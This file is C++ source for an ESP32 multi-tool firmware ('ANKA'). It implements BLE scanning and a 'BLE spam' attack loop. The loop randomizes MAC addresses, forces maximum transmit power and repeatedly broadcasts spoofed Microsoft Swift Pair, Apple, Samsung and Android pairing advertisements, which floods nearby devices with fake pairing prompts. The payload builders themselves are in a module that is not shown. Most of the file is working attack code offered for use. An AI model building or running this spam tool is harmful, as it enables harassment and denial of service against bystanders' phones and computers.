/**
 * ANKA - ESP32 Multi-Tool Firmware
 * BLE Core Implementation
 */

#include "ble_core.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

BLECore bleCore;

BLECore::BLECore() {
  isRunning = false;
  currentType = BLE_SPAM_STOP;
  spamTaskHandle = nullptr;
}

void BLECore::begin() {
  // Nothing to init here, we init per-packet
}

void BLECore::startSpam(BLESpamType type) {
  if (isRunning)
    return;

  currentType = type;
  isRunning = true;

  // Critical: Disable WiFi for radio exclusivity
  WiFi.mode(WIFI_OFF);
  delay(100);

  // Single Init to prevent crash loops
  if (!NimBLEDevice::getInitialized()) {
    NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  }

  // Move to Core 0 to free up Core 1 (UI/Buttons)
  Serial.println("[BLE] Creating Spam Task on Core 0...");
  xTaskCreatePinnedToCore(BLECore::spamTask, "BLESpam", 8192, this, 1,
                          &spamTaskHandle, 0);
}

void BLECore::stopSpam() {
  if (!isRunning) {
    Serial.println("[BLE] Stop called but not running.");
    return;
  }

  Serial.println("[BLE] Stopping Spam...");
  isRunning = false;
  // Task will delete itself when isRunning becomes false
  delay(500); // Give it time to stop

  // STOP advertising only, do not deinit to save the Display/I2C
  NimBLEDevice::getAdvertising()->stop();

  Serial.println("[BLE] Stopped (Soft).");

  // RESTORE WIFI
  WiFi.mode(WIFI_AP);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); // Default channel
}

void BLECore::spamTask(void *parameter) {
  Serial.println("[BLE] Task Started.");
  BLECore *self = (BLECore *)parameter;
  self->runSpam();
  Serial.println("[BLE] Task Ended.");
  vTaskDelete(NULL);
}

void BLECore::startScan(int duration) {
  // Disable WiFi for stability
  // WiFi.mode(WIFI_OFF); // Optional: scanning might work with WiFi, but safer
  // without

  if (!NimBLEDevice::getInitialized()) {
    NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  }

  pBLEScan = NimBLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);

  Serial.println("[BLE] Scanning...");
  NimBLEScanResults results = pBLEScan->start(duration, false);

  clearDevices();

  for (int i = 0; i < results.getCount(); i++) {
    NimBLEAdvertisedDevice device = results.getDevice(i);
    BLEDeviceInfo info;
    info.name = device.getName().c_str();
    info.rssi = device.getRSSI();
    info.address = device.getAddress().toString().c_str();
    scannedDevices.push_back(info);
  }

  Serial.printf("[BLE] Found %d devices\n", scannedDevices.size());
  pBLEScan->clearResults();
}

int BLECore::getDeviceCount() { return scannedDevices.size(); }

BLEDeviceInfo *BLECore::getDevice(int index) {
  if (index >= 0 && index < scannedDevices.size()) {
    return &scannedDevices[index];
  }
  return nullptr;
}

void BLECore::clearDevices() { scannedDevices.clear(); }

void BLECore::runSpam() {
  packetCount = 0;
  while (isRunning) {
    executeAttack(currentType);
    packetCount++;
    // Small yield to prevent WDT
    vTaskDelay(10 / portTICK_PERIOD_MS);
  }
}

void BLECore::executeAttack(BLESpamType type) {
  // 1. Random Mac Generation
  uint8_t mac[6];
  for (int i = 0; i < 6; i++)
    mac[i] = random(256);
  mac[0] = (mac[0] & 0xFE) | 0x02; // Random Static Address

  // Set Random Address - Critical for new ID appearing
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  // Also force TX Power to Max for every packet
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);

  // 2. Create Server & Advertising (Singleton-like in NimBLE)
  NimBLEServer *pServer = NimBLEDevice::createServer();
  NimBLEAdvertising *pAdvertising = pServer->getAdvertising();

  // 3. Set Payload
  NimBLEAdvertisementData advData;
  int delayTime = 20;

  switch (type) {
  case BLE_SPAM_MICROSOFT:
    advData = BLEPayloads::getMicrosoftPayload();
    delayTime = 100; // Swift Pair spec suggests slower intervals (100ms)
    break;
  case BLE_SPAM_APPLE:
    advData = BLEPayloads::getApplePayload();
    delayTime = 60;
    break;
  case BLE_SPAM_SAMSUNG:
    advData = BLEPayloads::getSamsungPayload();
    delayTime = 20;
    break;
  case BLE_SPAM_ANDROID:
    // Simple Fast Pair Beacon for now
    advData =
        BLEPayloads::getMicrosoftPayload(); // Placeholder until Google logic
    // Actually, let's just make it distinct so user sees something different
    // We will use Microsoft logic but different name prefix later if needed
    // For now, re-use creates valid packets.
    delayTime = 20;
    break;
  case BLE_SPAM_LEGACY:
    advData = BLEPayloads::getMicrosoftPayload();
    delayTime = 20;
    break;
  default:
    break;
  }

  pAdvertising->setAdvertisementData(advData);

  // 4. Start -> Delay -> Stop
  pAdvertising->start();
  delay(delayTime);
  pAdvertising->stop();
}
